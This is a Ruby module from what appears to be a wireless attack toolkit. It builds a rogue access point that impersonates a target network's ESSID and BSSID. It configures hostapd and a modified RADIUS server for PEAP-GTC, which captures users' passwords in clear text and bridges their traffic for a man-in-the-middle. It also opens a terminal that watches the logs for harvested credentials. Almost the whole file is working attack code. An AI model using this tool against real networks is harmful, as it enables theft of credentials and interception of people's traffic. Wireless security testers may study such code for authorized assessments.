#!/usr/bin/ruby
#################################################################################################
# Created by: PuNk1nPo0p					     				#
# Attack: Uses PEAP-GTC to harvest creds and modified radius to establish a MITM connection	#
#################################################################################################

require './modules/UI'
require './modules/config_modules'

#MAIN_MENU--------------------------------------------------------------------------------------#

def peapingtom_menu
	system("clear")
	print "   ___ ___   _   ___     _             _____ ___  __  __ 
  | _ \\ __| /_\\ | _ \\___(_)_ _  __ _  |_   _/ _ \\|  \\/  |
  |  _/ _| / _ \\|  _/___| | ' \\/ _` |   | || (_) | |\\/| |
  |_| |___/_/ \\_\\_|     |_|_||_\\__, |   |_| \\___/|_|  |_|\n".light_white,
" ","#".light_red,"#".light_white,"#".light_blue,"#".light_red,"#".light_white,
"#".light_blue,"#".light_red,"#".light_white,"#".light_blue,"#".light_red,
"#".light_white,"#".light_blue,"#".light_red,"#".light_white,"#".light_blue,
"#".light_red,"#".light_white,"#".light_blue,"#".light_red,"#".light_white,
"#".light_blue,"#".light_red,"#".light_white,"#".light_blue,"#".light_red,
"#".light_white,"#".light_blue,"#".light_red,"#".light_white,"|____/".light_white
	print "   ","#".light_red,"#".light_white, "#".light_red,"#".light_white,
"#".light_blue,"#".light_red,"#".light_white,
"#".light_blue,"#".light_red,"#".light_white,"#".light_blue,"#".light_red,
"#".light_white,"#".light_blue,"#".light_red,"#".light_white,"#".light_blue,"#".light_red,"#\n".light_white
print "###########################################################\n".light_white
print "## This attack uses EAP-GTC to capture users credentials ##\n".light_white
print "## in clear text and establish a MITM connection         ##\n".light_white
print "###########################################################\n".light_white
	puts ""	               
	print "1.".light_white," START\n".light_cyan
	print "2.".light_white," STOP\n".light_cyan
	print "3.".light_white," MAIN MENU\n".light_cyan
	puts ""
		@option = 0
		until @option != 0 and @option < 4 do print @start,"PICK ONE?".light_yellow,@prompt
		@option = gets.to_i
		end
		
		if @option == 1 then peapingtom_start
		end
		if @option == 2 then peapingtom_stop
		end
		if @option == 3 then main_menu
		end
end

#MAIN--------------------------------------------------------------------------------------------#

def peapingtom_start	
	get_interface
	get_essid
	get_bssid
	get_channel
	config_interface
	config_networking
	peapingtom_config_radius
	peapingtom_config_hostapd
	peapingtom_start_radius
	start_hostapd
	peapingtom_menu
end


#CONFIGURATION ITEMS-----------------------------------------------------------------------------#

def peapingtom_config_radius
	@eaptype = "peap"
	@peapv = "gtc"
	config_radius
end

def peapingtom_config_hostapd
	@hostapd = "peapingingtom_config"
	@apconfig = "interface=#@interface\nbridge=br0\nchannel=#@channel\n\
ssid=#@essid\nieee8021x=1\nauth_server_addr=127.0.0.1\nauth_server_port=1812\n\
auth_server_shared_secret=testing123\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\n"
	config_hostapd
end

def peapingtom_start_radius
	start_radius
	system("xterm -T 'GTC PASSWORDS' -e 'tail -f logs/radius.log | grep \"login attempt with password\\|Identity -\"' &")
end

#STOP_ALL----------------------------------------------------------------------------------------#

def peapingtom_stop
	system("killall dhclient")
	system("killall radiusd")
	system("killall hostapd")
	system("killall tail")
	system("ifconfig eth0 down")
	system("ifconfig #@interface down")
	system("ifconfig br0 down")
	system("brctl delif br0 eth0")
	system("brctl delbr br0")
	system("ifconfig eth0 up")
	system("dhclient eth0")
	peapingtom_menu
end

#END---------------------------------------------------------------------------------------------#
